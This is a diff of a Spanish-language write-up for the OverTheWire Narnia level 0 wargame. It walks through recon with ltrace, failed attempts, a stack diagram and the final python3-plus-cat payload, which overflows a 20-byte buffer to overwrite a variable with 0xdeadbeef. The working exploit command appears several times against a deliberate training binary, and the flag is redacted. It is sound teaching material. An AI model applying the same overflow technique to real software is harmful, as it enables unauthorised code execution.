@@ -8,161 +8,165 @@
 ```
 
 ```bash
-$ cat /etc/target
-> OverTheWire · Narnia · Level 0
+$ ssh narnia0@narnia.labs.overthewire.org -p 2226
 
-$ cat /etc/objective
-> sobreescribir val con 0xdeadbeef via buffer overflow
+$ echo $TARGET
+> un binario bocón · un vaso demasiado chico · cuatro bytes de veneno
 
 $ echo $VECTOR
-> stack · scanf sin límite · little endian
+> stack buffer overflow · little endian · scanf sin límite
 ```
 
 ---
 
-## `> cat recon.txt`
+## `> [RECON]`
 
 ```bash
-$ ssh narnia0@narnia.labs.overthewire.org -p 2226
 $ ltrace ./narnia0
 ```
 
-El binario habla solo.
-`0xdeadbeef` aparece en la cara sin que nadie se lo pida.
+El binario me escupió `0xdeadbeef` en la cara sin que nadie se lo pidiera.
 
-Si creés que es un número random, no llegaste a entender todavía.
-Buscá a **Jerry Saltzer**. Buscá por qué ese valor existe.
-En este mundo, nada es decorativo.
+Si ves ese valor y pensás *"número raro"* —
+todavía no estás mirando bien.
+
+> Buscá quién fue **Jerry Saltzer**.
+> Buscá por qué ese valor existe donde existe.
+> En este mundo nada es decorativo.
 
 ---
 
-## `> cat hypothesis.txt`
+## `> [HYPOTHESIS]`
 
 ```diff
-+ [H1] scanf sin límite → overflow posible
-+ [H2] val está en stack, adyacente a buf
-+ [H3] little endian → bytes invertidos
-- [H_WRONG] intenté con echo directo → Python 3 filtró los bytes
-- [H_WRONG] olvidé el cat → shell se cerraba antes de interactuar
++ buf[20] con scanf que acepta 24 → overflow controlable
++ val vive en stack justo después de buf → se puede pisar
++ 0xdeadbeef en little endian → bytes al revés
+- pensé que con echo -e alcanzaba
+- olvidé que Python 3 quiere ser inteligente con el encoding
 ```
 
 ---
 
-## `> cat attempts.txt`
+## `> [ATTEMPTS]`
 
 <details>
-<summary><code>[ATTEMPTS] — acá vive el aprendizaje real</code></summary>
+<summary><code>// l0s 3rr0r3s s0n d3 4c4. n0 l0s s4lt33s.</code></summary>
 
 ```bash
-# intento 1 — el clásico error de principiante
+# — intento 1
 $ echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde" | ./narnia0
-# resultado: nada. Python 3 traicionó los bytes.
-# lección: echo -e no es confiable para bytes raw.
+# los bytes llegaron sucios. echo -e no manda raw. nunca más.
 
-# intento 2 — sin cat
+# — intento 2
 $ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde")' | ./narnia0
-# resultado: shell abre y se cierra en la nariz.
-# lección: necesitás mantener stdin vivo para interactuar.
+# la shell abrió y se cerró antes de que pudiera respirar.
+# faltaba el cat. faltaba mantener stdin vivo.
 
-# intento 3 — correcto
+# — intento 3
 $ (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde")'; cat) | ./narnia0
-# resultado: shell de narnia1. flag obtenida.
+# ahí.
 ```
 
 </details>
 
 ---
 
-## `> cat break.txt`
+## `> [BREAK]`
 
-El stack se ve así antes del exploit:
+El stack antes del exploit:
 
 ```
-[ buf[0] ][ buf[1] ]...[ buf[19] ][ val        ]
-[  A  ][  A  ]...[  A  ][ef][be][ad][de]
-         ← 20 bytes de relleno →   ← 0xdeadbeef →
+direcciones bajas ↓
+
+  [ buf ] [ buf ] [ buf ] ... [ buf ]  [        val        ]
+     0       1       2    ...   19     
+
+direcciones altas ↑
 ```
 
-Veinticuatro bytes entraron donde cabían veinte.
-Los cuatro que sobraron no desaparecieron —
-se chorrearon sobre `val`.
+El stack después:
 
-Eso es todo. No es magia. Es física de memoria.
+```
+  [ A  ][ A  ][ A  ] ... [ A  ] [ ef ][ be ][ ad ][ de ]
+    ↑— — — — 20 bytes — — — — ↑  ↑— — 0xdeadbeef — — ↑
+```
 
-> El programador dejó un `scanf("%24s", buf)` sobre un `buf[20]`.
-> Cuatro bytes de diferencia. El mismo error que hundió el **Ariane 5** en 1996.
-> Un desborde de entero. 500 millones de dólares. Investigalo.
+Veinticuatro bytes en un espacio de veinte.
+Los cuatro que sobraron no desaparecieron.
+Se chorrearon sobre `val` y lo pisaron.
+
+Eso es todo.
+No es magia. Es que la memoria es lineal y el programador era descuidado.
 
 ---
 
-## `> cat exploit.txt`
+## `> [EXPLOIT]`
 
 ```bash
 (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde")'; cat) | ./narnia0
 ```
 
-Desglosado, porque el que copia sin entender es el primero en caer:
-
 ```
-python3 -c               → ejecución directa. sin archivos. al grano.
-sys.stdout.buffer.write  → bytes puros. Python 3 no filtra nada.
-b"A"*20                  → 20 bytes de relleno. el vaso hasta el borde.
-b"\xef\xbe\xad\xde"      → 0xdeadbeef en little endian. al revés.
-                            buscá a Danny Cohen si no sabés por qué.
-; cat                    → soporte vital. mantiene stdin abierto.
-                            sin esto la shell se te cierra en la nariz.
-```
-
----
-
-## `> cat reflection.txt`
-
-```diff
-+ little endian no es opcional saberlo. es el alfabeto.
-+ cat como soporte vital → patrón que se repite en exploits interactivos.
-+ ltrace antes que gdb. el binario habla solo si sabés escuchar.
-- perdí tiempo con echo -e. nunca más para bytes raw.
+python3 -c              → directo. sin archivos. sin preámbulo.
+sys.stdout.buffer.write → bytes puros. sin que Python filtre nada.
+b"A"*20                 → el vaso hasta el borde. ni uno más.
+b"\xef\xbe\xad\xde"     → 0xdeadbeef al revés. little endian.
+                           si no sabés por qué los procesadores
+                           leen así, buscá a Danny Cohen.
+                           si no lo buscás, sos turista.
+; cat                   → soporte vital.
+                           sin esto la shell se cierra en tu nariz.
 ```
 
 ---
 
-## `> cat flag.txt`
+## `> [FLAG]`
 
 ```
 [REDACTED]
 ```
 
-> La flag no es el punto.
-> El punto es saber que podías llegar.
+> n0 m3 l4 d1g4s. n0 m3 1nt3r3s4.
+> 3l pr3m10 n0 3s un str1ng d3 t3xt0.
+
+---
+
+## `> [REFLECTION]`
+
+```diff
++ ltrace primero. siempre. el binario habla si sabés escuchar.
++ cat como soporte vital → patrón que se repite. grabalo.
++ little endian no es detalle. es el alfabeto de la arquitectura.
+- echo -e para bytes raw → nunca más. aprendido con sangre.
+```
 
 ---
 
 ## `> echo $CHALLENGE`
 
-```
 El programador dejó que entraran 24 bytes en un espacio de 20.
-¿Qué tiene que ver ese error con el hundimiento del Ariane 5 en el 96?
 
-El que lo encuentre va a entender por qué un pequeño desborde
-puede costar quinientos millones de dólares.
+Explicame qué tiene que ver ese error
+con el **hundimiento del Ariane 5 en 1996**.
+
+El que lo encuentre va a entender por qué cuatro bytes
+pueden costar quinientos millones de dólares.
 
 Lo demás es charla de café.
-```
 
 ---
 
 ```
-██████████████████████████████████████████
-█                                        █
-█   3l d3sb0rd3 n0 fu3 un 4cc1d3nt3.    █
-█   fu3 un 4v1s0.                        █
-█                                        █
-██████████████████████████████████████████
+█████████████████████████████████████████████
+█                                           █
+█   3l d3sb0rd3 n0 fu3 un 4cc1d3nt3.       █
+█             fu3 un 4v1s0.                 █
+█                                           █
+█████████████████████████████████████████████
 ```
 
----
-
-> *→ video completo: [youtube.com/@t474-r0b07](https://youtube.com/@t474-r0b07)*
-> *→ siguiente nivel: [narnia1](../narnia1/)*
+> *→ [youtube.com/@t474-r0b07](https://youtube.com/@t474-r0b07)*
+> *→ siguiente: [narnia1](../narnia1/)*
 
 <!-- 0x4e 0x41 0x52 0x4e 0x49 0x41 // 3l 0r1g3n 3s 0tr0 l4d0 -->
